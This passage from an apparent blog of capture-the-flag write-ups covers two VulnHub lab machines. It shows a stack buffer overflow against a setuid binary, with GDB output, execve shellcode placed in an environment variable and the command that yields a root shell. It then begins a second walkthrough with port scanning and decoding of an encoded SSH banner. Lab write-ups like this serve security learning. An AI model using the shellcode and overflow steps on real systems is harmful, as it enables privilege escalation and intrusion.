EBX: 0xb7fbeff4 --&gt; 0x15ed7c
ECX: 0xbffff4d8 --&gt; 0xb7fbf4e0 --&gt; 0xfbad2a84
EDX: 0xb7fc0360 --&gt; 0x0
ESI: 0x0
EDI: 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff610 ('A' &lt;repeats 28 times&gt;)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xbffff610 ('A' &lt;repeats 28 times&gt;)
0004| 0xbffff614 ('A' &lt;repeats 24 times&gt;)
0008| 0xbffff618 ('A' &lt;repeats 20 times&gt;)
0012| 0xbffff61c ('A' &lt;repeats 16 times&gt;)
0016| 0xbffff620 ('A' &lt;repeats 12 times&gt;)
0020| 0xbffff624 ("AAAAAAAA")
0024| 0xbffff628 ("AAAA")
0028| 0xbffff62c --&gt; 0x8048200 --&gt; 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$
</code></pre>

<p>Standard buffer overflow process here (I don&rsquo;t want to teach you how to suck eggs tbh, there&rsquo;s enough resources online). EIP is at 269, so&hellip;</p>

<pre><code class="bash">gdb-peda$ r $(python -c 'print "A"*268 + "BBBB"');

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x110
EBX: 0xb7fbeff4 --&gt; 0x15ed7c
ECX: 0xbffff4f8 --&gt; 0xb7fbf4e0 --&gt; 0xfbad2a84
EDX: 0xb7fc0360 --&gt; 0x0
ESI: 0x0
EDI: 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff630 --&gt; 0x0
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xbffff630 --&gt; 0x0
0004| 0xbffff634 --&gt; 0xbffff6d4 --&gt; 0xbffff7f8 ("/root/troll/r00t")
0008| 0xbffff638 --&gt; 0xbffff6e0 --&gt; 0xbffff91a ("SHELL=/bin/bash")
0012| 0xbffff63c --&gt; 0xb7fe0860 --&gt; 0xb7e60000 --&gt; 0x464c457f
0016| 0xbffff640 --&gt; 0xb7ff6821 (mov    eax,DWORD PTR [ebp-0x10])
0020| 0xbffff644 --&gt; 0xffffffff
0024| 0xbffff648 --&gt; 0xb7ffeff4 --&gt; 0x1cf2c
0028| 0xbffff64c --&gt; 0x8048278 ("__libc_start_main")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$
</code></pre>

<p>OK, easy peasy. GDB identifies that there isn&rsquo;t a jmp esp in the binary, but it is a dynamically linked binary, so ret2libc is possible. But why make it more complicated for ourselves ? Naaah. Our shellcode can be placed in an environment value</p>

<pre><code class="bash">export SHELLCODE=$(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
</code></pre>

<p>Which can be located within GDB</p>

<pre><code class="bash">gdb ./r00t
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
&lt;http://bugs.launchpad.net/gdb-linaro/&gt;...
Reading symbols from /nothing_to_see_here/choose_wisely/door1/r00t...done.
(gdb) break main
Breakpoint 1 at 0x8048450: file bof.c, line 7.
(gdb) run
Starting program: /nothing_to_see_here/choose_wisely/door1/r00t 

Breakpoint 1, main (argc=1, argv=0xbffffcb4) at bof.c:7
(gdb) 7 bof.c: No such file or directory.
x/100xw $esp
0xbffffb00: 0x00000000  0x00000000  0x00000001  0x000008b0
0xbffffb10: 0x40024b48  0x40024858  0x08048278  0x40037158
0xbffffb20: 0x0804821c  0x00000001  0x400c2230  0x400c245e
0xbffffb30: 0xbffffb68  0x40020ff4  0x40021ad0  0xbffffc54
0xbffffb40: 0xbffffc10  0x40009ed9  0xbffffbf0  0x0804821c
0xbffffb50: 0xbffffbd8  0x40021a74  0x00000000  0x40024b48
0xbffffb60: 0x00000001  0x00000000  0x00000001  0x40021918
0xbffffb70: 0x00000000  0x00000000  0x00000000  0x401cfff4
0xbffffb80: 0xbffffbce  0xbffffbcf  0x00000001  0x400c27b9
0xbffffb90: 0xbffffbcf  0xbffffbce  0x00000000  0x40015fec
0xbffffba0: 0xbffffc54  0x40022000  0x00000000  0x4005cc73
0xbffffbb0: 0x08048278  0x00000000  0x00c10000  0x00000001
0xbffffbc0: 0xbffffdc2  0x0000002f  0xbffffc1c  0x401cfff4
0xbffffbd0: 0x080484b0  0x08049ff4  0x00000001  0x0804831d
0xbffffbe0: 0x401d03e4  0x0000000d  0x08049ff4  0x080484d1
0xbffffbf0: 0xffffffff  0x4005cdc6  0x401cfff4  0x4005ce55
0xbffffc00: 0x4000f280  0x00000000  0x080484b9  0x401cfff4
0xbffffc10: 0x080484b0  0x00000000  0x00000000  0x400434d3
0xbffffc20: 0x00000001  0xbffffcb4  0xbffffcbc  0x40024858
0xbffffc30: 0x00000000  0xbffffc1c  0xbffffcbc  0x00000000
0xbffffc40: 0x0804823c  0x401cfff4  0x00000000  0x00000000
0xbffffc50: 0x00000000  0xdd889bc6  0x2a19fe39  0x00000000
0xbffffc60: 0x00000000  0x00000000  0x00000001  0x08048390
0xbffffc70: 0x00000000  0x400146b0  0x400433e9  0x40020ff4
0xbffffc80: 0x00000001  0x08048390  0x00000000  0x080483b1
(gdb)
0xbffffc90: 0x08048444  0x00000001  0xbffffcb4  0x080484b0
0xbffffca0: 0x08048520  0x4000f280  0xbffffcac  0x40021918
0xbffffcb0: 0x00000001  0xbffffdc2  0x00000000  0xbffffdf0
0xbffffcc0: 0xbffffe77  0xbffffe87  0xbffffea9  0xbffffeb3
0xbffffcd0: 0xbffffebe  0xbffffed2  0xbfffff1f  0xbfffff2e
0xbffffce0: 0xbfffff5b  0xbfffff6c  0xbfffff75  0xbfffff85
0xbffffcf0: 0xbfffff8d  0xbfffff9a  0x00000000  0x00000020
0xbffffd00: 0x40022414  0x00000021  0x40022000  0x00000010
0xbffffd10: 0x0fabfbff  0x00000006  0x00001000  0x00000011
0xbffffd20: 0x00000064  0x00000003  0x08048034  0x00000004
0xbffffd30: 0x00000020  0x00000005  0x00000009  0x00000007
0xbffffd40: 0x40000000  0x00000008  0x00000000  0x00000009
0xbffffd50: 0x08048390  0x0000000b  0x000003ea  0x0000000c
0xbffffd60: 0x000003ea  0x0000000d  0x000003ea  0x0000000e
0xbffffd70: 0x000003ea  0x00000017  0x00000001  0x00000019
0xbffffd80: 0xbffffdab  0x0000001f  0xbfffffce  0x0000000f
0xbffffd90: 0xbffffdbb  0x00000000  0x00000000  0x00000000
0xbffffda0: 0x00000000  0x00000000  0xf6000000  0x6d8240c1
0xbffffdb0: 0xc85c9138  0x1f1bbf89  0x692ef87a  0x00363836
0xbffffdc0: 0x6e2f0000  0x6968746f  0x745f676e  0x65735f6f
0xbffffdd0: 0x65685f65  0x632f6572  0x736f6f68  0x69775f65
0xbffffde0: 0x796c6573  0x6f6f642f  0x722f3172  0x00743030
0xbffffdf0: 0x4c454853  0x444f434c  0x90903d45  0x90909090
0xbffffe00: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffe10: 0x90909090  0x90909090  0x90909090  0x90909090
(gdb)
</code></pre>

<p>Shellcode starts around 0xbffffe10, so we just change our EIP to that memory location to run the shellcode. As proven within GDB, it runs as expected and /bin/dash is executed (GDB strips EUID though)</p>

<pre><code class="bash">(gdb) r $(python -c 'print "A"*268 + "\x10\xfe\xff\xbf"')
Starting program: /nothing_to_see_here/choose_wisely/door1/r00t $(python -c 'print "A"*268 + "\x10\xfe\xff\xbf"')
process 1575 is executing new program: /bin/dash
id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
exit
[Inferior 1 (process 1575) exited with code 0177]
(gdb)
</code></pre>

<p>When run outside of GDB, we get dropped to a root shell</p>

<pre><code class="bash">./r00t $(python -c 'print "A"*268 + "\x10\xfe\xff\xbf"')
id
uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
cd /root
ls -ls
total 40
4 -rw-r--r-- 1 root   root     68 Oct  6 18:32 Proof.txt
4 drwxr-xr-x 5 root   root   4096 Oct  4 22:35 core1
4 drwxr-xr-x 5 root   root   4096 Oct  4 22:36 core2
4 drwxr-xr-x 5 root   root   4096 Oct  4 22:36 core3
4 drwxr-xr-x 5 root   root   4096 Oct  4 22:36 core4
4 drwxr-xr-x 2 root   root   4096 Oct  5 21:14 goal
4 drwxr-xr-x 2 root   root   4096 Oct  6 18:36 hardmode
4 -rw-r--r-- 1 maleus maleus 1474 Oct  4 00:28 lmao.zip
4 -rw-r--r-- 1 root   root    828 Oct  4 22:43 ran_dir.py
4 drwxr-xr-x 2 root   root   4096 Oct  6 18:35 reboot
cat Proof.txt
You win this time young Jedi...

a70354f0258dcc00292c72aab3c8b1e4
</code></pre>

<p><img src="http://cdn-media-2.lifehack.org/wp-content/files/2014/08/Getting-it-done-gif.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How Many Hackers Does It Take To Change A Lightbulb ?]]></title>
    <link href="http://recrudesce.github.io/2014/08/13/how-many-hackers-does-it-take-to-change-a-lightbulb/"/>
    <updated>2014-08-13T01:00:28+01:00</updated>
    <id>http://recrudesce.github.io/2014/08/13/how-many-hackers-does-it-take-to-change-a-lightbulb</id>
    <content type="html"><![CDATA[<p>Whilst in the middle of cracking <a href="http://vulnhub.com/entry/xerxes-2,97/">Xerxes2</a>, <a href="https://twitter.com/leonjza">leonjza</a> decided to release <a href="http://vulnhub.com/entry/flick-1,99/">Flick</a> - a CTF that is sure to tax minds.  Naturally I decided to make myself feel like an unskilled loser, and downloaded it. Here&rsquo;s the story of how I rooted Flick first.</p>

<p>{% blockquote Russ Watts (@recrudesce) <a href="https://twitter.com/recrudesce/statuses/499168321150124033">https://twitter.com/recrudesce/statuses/499168321150124033</a> %}
root@flick:~# id
uid=0(root) gid=0(root) groups=0(root)
First ! @leonjza @VulnHub #flick #boot2root #vulnhub
{% endblockquote %}</p>

<!-- more -->


<h2>&lsquo;Avin&rsquo; a Butchers</h2>

<p>Blah blah NMAP blah ;)</p>

<pre><code class="bash">root@pwk:~# nmap -sS -O -p1-65535 -T4 192.168.0.106

Starting Nmap 6.46 ( http://nmap.org ) at 2014-08-08 22:39 BST
Nmap scan report for 192.168.0.106
Host is up (0.00s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 04:d0:8d:4d:ee:87:30:e7:60:82:63:d3:a8:6e:4b:ac (DSA)
|   2048 64:ec:a9:9b:0b:c0:11:d4:08:63:cf:83:e1:db:23:9a (RSA)
|_  256 2d:32:93:ce:0e:54:3f:84:ee:01:c7:c0:bb:68:e2:02 (ECDSA)
8881/tcp open  unknown

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>

<p>SSH and a random unknown port - ominous. A quick netcat to the port presents us with a request for a password</p>

<pre><code class="bash">root@pwk:~# nc 192.168.0.106 8881
Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
&gt;
</code></pre>

<p>Anything you type in just gets repeated back to you. I also checked for buffer overflows and format string vulns, but no avail - looks like I need a password.</p>

<pre><code class="bash">Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
OK: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

&gt; %s%s%s%s
OK: %s%s%s%s

&gt; wut ?
OK: wut ?

&gt; 
</code></pre>

<p><img src="http://static.fjcdn.com/gifs/MFW+someone+tries+to+open+IE.+that+makes+me+a_c3c81f_4698730.gif" alt="" /></p>

<p>OK, so not knowing the password, I decided to check out SSH.</p>

<pre><code class="bash">root@pwk:~# ssh blah@192.168.0.106

\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34
\x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
\x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68
\x4d\x6b\x30\x78\x56\x6d\x70\x4b\x53\x31\x49\x79\x53\x6b\x56\x55\x62\x47\x68\x6f
\x54\x56\x68\x43\x55\x56\x5a\x74\x65\x46\x5a\x6c\x52\x6c\x6c\x35\x56\x47\x74\x73
\x61\x6c\x4a\x74\x61\x47\x39\x55\x56\x6d\x68\x44\x56\x56\x5a\x61\x63\x56\x46\x74
\x52\x6c\x70\x57\x4d\x44\x45\x31\x56\x54\x4a\x30\x56\x31\x5a\x58\x53\x6b\x68\x68
\x52\x7a\x6c\x56\x56\x6d\x78\x61\x4d\x31\x5a\x73\x57\x6d\x46\x6b\x52\x30\x35\x47
\x57\x6b\x5a\x53\x54\x6d\x46\x36\x52\x54\x46\x57\x56\x45\x6f\x77\x56\x6a\x46\x61
\x57\x46\x4e\x72\x61\x47\x68\x53\x65\x6d\x78\x57\x56\x6d\x70\x4f\x54\x30\x30\x78
\x63\x46\x5a\x58\x62\x55\x5a\x72\x55\x6a\x41\x31\x52\x31\x64\x72\x57\x6e\x64\x57
\x4d\x44\x46\x46\x55\x6c\x52\x47\x56\x31\x5a\x46\x62\x33\x64\x57\x61\x6b\x5a\x68
\x56\x30\x5a\x4f\x63\x6d\x46\x48\x61\x46\x4e\x6c\x62\x58\x68\x58\x56\x6d\x30\x78
\x4e\x46\x6c\x56\x4d\x48\x68\x58\x62\x6b\x35\x59\x59\x6c\x56\x61\x63\x6c\x56\x71
\x51\x54\x46\x53\x4d\x57\x52\x79\x56\x32\x78\x4f\x56\x57\x4a\x56\x63\x45\x64\x5a
\x4d\x46\x5a\x33\x56\x6a\x4a\x4b\x56\x56\x4a\x59\x5a\x46\x70\x6c\x61\x33\x42\x49
\x56\x6d\x70\x47\x54\x32\x52\x57\x56\x6e\x52\x68\x52\x6b\x35\x73\x59\x6c\x68\x6f
\x57\x46\x5a\x74\x4d\x58\x64\x55\x4d\x56\x46\x33\x54\x55\x68\x6f\x61\x6c\x4a\x73
\x63\x46\x6c\x5a\x62\x46\x5a\x68\x59\x32\x78\x57\x63\x56\x46\x55\x52\x6c\x4e\x4e
\x56\x6c\x59\x31\x56\x46\x5a\x53\x55\x31\x5a\x72\x4d\x58\x4a\x6a\x52\x6d\x68\x57
\x54\x57\x35\x53\x4d\x31\x5a\x71\x53\x6b\x74\x57\x56\x6b\x70\x5a\x57\x6b\x5a\x77
\x62\x47\x45\x7a\x51\x6b\x6c\x57\x62\x58\x42\x48\x56\x44\x4a\x53\x56\x31\x5a\x75
\x55\x6d\x68\x53\x61\x7a\x56\x7a\x57\x57\x78\x6f\x62\x31\x64\x47\x57\x6e\x52\x4e
\x53\x47\x68\x50\x55\x6d\x31\x34\x56\x31\x52\x56\x61\x47\x39\x58\x52\x30\x70\x79
\x54\x6c\x5a\x73\x57\x6d\x4a\x47\x57\x6d\x68\x5a\x4d\x6e\x68\x58\x59\x7a\x46\x57
\x63\x6c\x70\x47\x61\x47\x6c\x53\x4d\x31\x46\x36\x56\x6a\x4a\x30\x55\x31\x55\x78
\x57\x6e\x4a\x4e\x57\x45\x70\x71\x55\x6d\x31\x6f\x56\x31\x52\x58\x4e\x56\x4e\x4e
\x4d\x56\x70\x78\x55\x32\x74\x30\x56\x31\x5a\x72\x63\x46\x70\x58\x61\x31\x70\x33
\x56\x6a\x46\x4b\x56\x32\x4e\x49\x62\x46\x64\x57\x52\x55\x70\x6f\x56\x6b\x52\x4b
\x54\x32\x52\x47\x53\x6e\x4a\x61\x52\x6d\x68\x70\x56\x6a\x4e\x6f\x56\x56\x64\x57
\x55\x6b\x39\x52\x4d\x57\x52\x48\x56\x32\x35\x53\x54\x6c\x5a\x46\x53\x6c\x68\x55
\x56\x33\x68\x48\x54\x6c\x5a\x61\x57\x45\x35\x56\x4f\x56\x68\x53\x4d\x48\x42\x4a
\x56\x6c\x64\x34\x63\x31\x64\x74\x53\x6b\x68\x68\x52\x6c\x4a\x58\x54\x55\x5a\x77
\x56\x46\x5a\x71\x52\x6e\x64\x53\x4d\x56\x4a\x30\x5a\x55\x64\x73\x55\x32\x4a\x59
\x59\x33\x68\x57\x61\x31\x70\x68\x56\x54\x46\x56\x65\x46\x64\x75\x53\x6b\x35\x58
\x52\x58\x42\x78\x56\x57\x78\x6b\x4e\x47\x46\x47\x56\x58\x64\x68\x52\x55\x35\x55
\x55\x6d\x78\x77\x65\x46\x55\x79\x64\x47\x46\x69\x52\x6c\x70\x7a\x56\x32\x78\x77
\x57\x47\x45\x78\x63\x44\x4e\x5a\x61\x32\x52\x47\x5a\x57\x78\x47\x63\x6d\x4a\x47
\x5a\x46\x64\x4e\x4d\x45\x70\x4a\x56\x6d\x74\x53\x53\x31\x55\x78\x57\x58\x68\x57
\x62\x6c\x5a\x57\x59\x6c\x68\x43\x56\x46\x6c\x72\x56\x6e\x64\x57\x56\x6c\x70\x30
\x5a\x55\x63\x35\x55\x6b\x31\x58\x55\x6e\x70\x57\x4d\x6a\x56\x4c\x56\x30\x64\x4b
\x53\x46\x56\x74\x4f\x56\x56\x57\x62\x48\x42\x59\x56\x47\x78\x61\x59\x56\x64\x48
\x56\x6b\x68\x6b\x52\x32\x68\x70\x55\x6c\x68\x42\x64\x31\x64\x57\x56\x6d\x39\x55
\x4d\x56\x70\x30\x55\x6d\x35\x4b\x54\x31\x5a\x73\x53\x6c\x68\x55\x56\x6c\x70\x33
\x56\x30\x5a\x72\x65\x46\x64\x72\x64\x47\x70\x69\x56\x6b\x70\x49\x56\x6c\x64\x34
\x61\x32\x46\x57\x53\x6e\x52\x50\x56\x45\x35\x58\x54\x57\x35\x6f\x57\x46\x6c\x71
\x53\x6b\x5a\x6c\x52\x6d\x52\x5a\x57\x6b\x55\x31\x56\x31\x5a\x73\x63\x46\x56\x58
\x56\x33\x52\x72\x56\x54\x46\x73\x56\x31\x56\x73\x57\x6c\x68\x69\x56\x56\x70\x7a
\x57\x57\x74\x61\x64\x32\x56\x47\x56\x58\x6c\x6b\x52\x45\x4a\x58\x54\x56\x5a\x77
\x65\x56\x59\x79\x65\x48\x64\x58\x62\x46\x70\x58\x59\x30\x68\x4b\x56\x31\x5a\x46
\x57\x6b\x78\x57\x4d\x56\x70\x48\x59\x32\x31\x4b\x52\x31\x70\x47\x5a\x45\x35\x4e
\x52\x58\x42\x4b\x56\x6d\x31\x30\x55\x31\x4d\x78\x56\x58\x68\x58\x57\x47\x68\x68
\x55\x30\x5a\x61\x56\x6c\x6c\x72\x57\x6b\x74\x6a\x52\x6c\x70\x78\x56\x47\x30\x35
\x56\x31\x5a\x73\x63\x45\x68\x58\x56\x45\x35\x76\x59\x56\x55\x78\x57\x46\x56\x75
\x63\x46\x64\x4e\x56\x32\x68\x32\x56\x31\x5a\x61\x53\x31\x49\x78\x54\x6e\x56\x52
\x62\x46\x5a\x58\x54\x54\x46\x4b\x4e\x6c\x5a\x48\x64\x47\x46\x68\x4d\x6b\x35\x7a
\x56\x32\x35\x53\x61\x31\x4a\x74\x55\x6e\x42\x57\x62\x47\x68\x44\x54\x6c\x5a\x6b
\x56\x56\x46\x74\x52\x6d\x70\x4e\x56\x31\x49\x77\x56\x54\x4a\x30\x61\x31\x64\x48
\x53\x6c\x68\x68\x52\x30\x5a\x56\x56\x6d\x78\x77\x4d\x31\x70\x58\x65\x48\x4a\x6c
\x56\x31\x5a\x49\x5a\x45\x64\x30\x55\x32\x45\x7a\x51\x58\x64\x58\x62\x46\x5a\x68
\x59\x54\x4a\x47\x56\x31\x64\x75\x53\x6d\x6c\x6c\x61\x31\x70\x59\x57\x57\x78\x6f
\x51\x31\x52\x47\x55\x6e\x4a\x58\x62\x45\x70\x73\x55\x6d\x31\x53\x65\x6c\x6c\x56
\x57\x6c\x4e\x68\x56\x6b\x70\x31\x55\x57\x78\x77\x56\x32\x4a\x59\x55\x6c\x68\x61
\x52\x45\x5a\x72\x55\x6a\x4a\x4b\x53\x56\x52\x74\x61\x46\x4e\x57\x56\x46\x5a\x61
\x56\x6c\x63\x78\x4e\x47\x51\x79\x56\x6b\x64\x57\x62\x6c\x4a\x72\x55\x6b\x56\x4b
\x62\x31\x6c\x59\x63\x45\x64\x6c\x56\x6c\x4a\x7a\x56\x6d\x35\x4f\x57\x47\x4a\x47
\x63\x46\x68\x5a\x4d\x47\x68\x4c\x56\x32\x78\x61\x57\x46\x56\x72\x5a\x47\x46\x57
\x56\x31\x4a\x51\x56\x54\x42\x6b\x52\x31\x49\x79\x52\x6b\x68\x69\x52\x6b\x35\x70
\x59\x54\x42\x77\x4d\x6c\x5a\x74\x4d\x54\x42\x56\x4d\x55\x31\x34\x56\x56\x68\x73
\x56\x56\x64\x48\x65\x46\x5a\x5a\x56\x45\x5a\x33\x59\x55\x5a\x57\x63\x56\x4e\x74
\x4f\x56\x64\x53\x62\x45\x70\x5a\x56\x47\x78\x6a\x4e\x57\x45\x79\x53\x6b\x64\x6a
\x52\x57\x68\x58\x59\x6c\x52\x42\x4d\x56\x5a\x58\x63\x33\x68\x58\x52\x6c\x5a\x7a
\x59\x55\x5a\x6b\x54\x6c\x59\x79\x61\x44\x4a\x57\x61\x6b\x4a\x72\x55\x7a\x46\x6b
\x56\x31\x5a\x75\x53\x6c\x42\x57\x62\x48\x42\x76\x57\x56\x52\x47\x64\x31\x4e\x57
\x57\x6b\x68\x6c\x52\x30\x5a\x61\x56\x6d\x31\x53\x52\x31\x52\x73\x57\x6d\x46\x56
\x52\x6c\x6c\x35\x59\x55\x5a\x6f\x57\x6c\x64\x49\x51\x6c\x68\x56\x4d\x46\x70\x68
\x59\x31\x5a\x4f\x63\x56\x56\x73\x57\x6b\x35\x57\x4d\x55\x6c\x33\x56\x6c\x52\x4b
\x4d\x47\x49\x79\x52\x6b\x64\x54\x62\x6b\x35\x55\x59\x6b\x64\x6f\x56\x6c\x5a\x73
\x57\x6e\x64\x4e\x4d\x56\x70\x79\x56\x32\x31\x47\x61\x6c\x5a\x72\x63\x44\x42\x61
\x52\x57\x51\x77\x56\x6a\x4a\x4b\x63\x6c\x4e\x72\x61\x46\x64\x53\x4d\x32\x68\x6f
\x56\x6b\x52\x4b\x52\x31\x59\x78\x54\x6e\x56\x56\x62\x45\x4a\x58\x55\x6c\x52\x57
\x57\x56\x64\x57\x55\x6b\x64\x6b\x4d\x6b\x5a\x48\x56\x32\x78\x57\x55\x32\x45\x78
\x63\x48\x4e\x56\x62\x54\x46\x54\x5a\x57\x78\x73\x56\x6c\x64\x73\x54\x6d\x68\x53
\x56\x45\x5a\x61\x56\x56\x63\x31\x62\x31\x59\x78\x57\x58\x70\x68\x53\x45\x70\x61
\x59\x57\x74\x61\x63\x6c\x56\x71\x52\x6c\x64\x6a\x4d\x6b\x5a\x47\x54\x31\x5a\x6b
\x56\x31\x5a\x47\x57\x6d\x46\x57\x62\x47\x4e\x34\x54\x6b\x64\x52\x65\x56\x5a\x72
\x5a\x46\x64\x69\x62\x45\x70\x79\x56\x57\x74\x57\x53\x32\x49\x78\x62\x46\x6c\x6a
\x52\x57\x52\x73\x56\x6d\x78\x4b\x65\x6c\x5a\x74\x4d\x44\x56\x58\x52\x30\x70\x48
\x59\x30\x5a\x6f\x57\x6b\x31\x48\x61\x45\x78\x57\x4d\x6e\x68\x68\x56\x30\x5a\x57
\x63\x6c\x70\x48\x52\x6c\x64\x4e\x4d\x6d\x68\x4a\x56\x31\x52\x4a\x65\x46\x4d\x78
\x53\x58\x68\x6a\x52\x57\x52\x68\x55\x6d\x73\x31\x57\x46\x59\x77\x56\x6b\x74\x4e
\x62\x46\x70\x30\x59\x30\x56\x6b\x57\x6c\x59\x77\x56\x6a\x52\x57\x62\x47\x68\x76
\x56\x30\x5a\x6b\x53\x47\x46\x47\x57\x6c\x70\x69\x57\x47\x68\x6f\x56\x6d\x31\x34
\x63\x32\x4e\x73\x5a\x48\x4a\x6b\x52\x33\x42\x54\x59\x6b\x5a\x77\x4e\x46\x5a\x58
\x4d\x54\x42\x4e\x52\x6c\x6c\x34\x56\x32\x35\x4f\x61\x6c\x4a\x58\x61\x46\x68\x57
\x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36
\x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77
\x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d

 .o88o. oooo   o8o            oooo
 888 `" `888   `"'            `888
o888oo   888  oooo   .ooooo.   888  oooo
 888     888  `888  d88' `"Y8  888 .8P'
 888     888   888  888        888888.
 888     888   888  888   .o8  888 `88b.
o888o   o888o o888o `Y8bod8P' o888o o888o 

blah@192.168.0.106's password: 
</code></pre>

<p>OK, that&rsquo;s something - I&rsquo;m intrigued to see what the hex decodes to</p>

<pre><code class="bash">root@pwk:~# echo -e "\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34
&gt; \x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
&gt; \x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68
&gt; \x4d\x6b\x30\x78\x56\x6d\x70\x4b\x53\x31\x49\x79\x53\x6b\x56\x55\x62\x47\x68\x6f
&gt; \x54\x56\x68\x43\x55\x56\x5a\x74\x65\x46\x5a\x6c\x52\x6c\x6c\x35\x56\x47\x74\x73
&gt; \x61\x6c\x4a\x74\x61\x47\x39\x55\x56\x6d\x68\x44\x56\x56\x5a\x61\x63\x56\x46\x74

************************************** SNIP **************************************
&gt; \x56\x30\x5a\x6b\x53\x47\x46\x47\x57\x6c\x70\x69\x57\x47\x68\x6f\x56\x6d\x31\x34
&gt; \x63\x32\x4e\x73\x5a\x48\x4a\x6b\x52\x33\x42\x54\x59\x6b\x5a\x77\x4e\x46\x5a\x58
&gt; \x4d\x54\x42\x4e\x52\x6c\x6c\x34\x56\x32\x35\x4f\x61\x6c\x4a\x58\x61\x46\x68\x57
&gt; \x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36
&gt; \x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77
&gt; \x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d"
Vm0wd2QyUXlVWGxWV0d4
V1YwZDRWMVl3WkRSWFJt
eFZVMjA1VjAxV2JETlhh
Mk0xVmpKS1IySkVUbGho
TVhCUVZteFZlRll5VGts
alJtaG9UVmhDVVZacVFt
RlpWMDE1VTJ0V1ZXSkhh

******* SNIP *******
V0ZkSGFGWlpiWGhoVm14
c2NsZHJkR3BTYkZwNFZX
MTBNRll4V25OalJXaFhW
ak5TVEZsVVFYaFNWa3B6
Vkd4YVUySkZXWHBXVlZw
R1QxWkNVbEJVTUQwPQ==
</code></pre>

<p>Oooh, base64 - this has to be the password !</p>

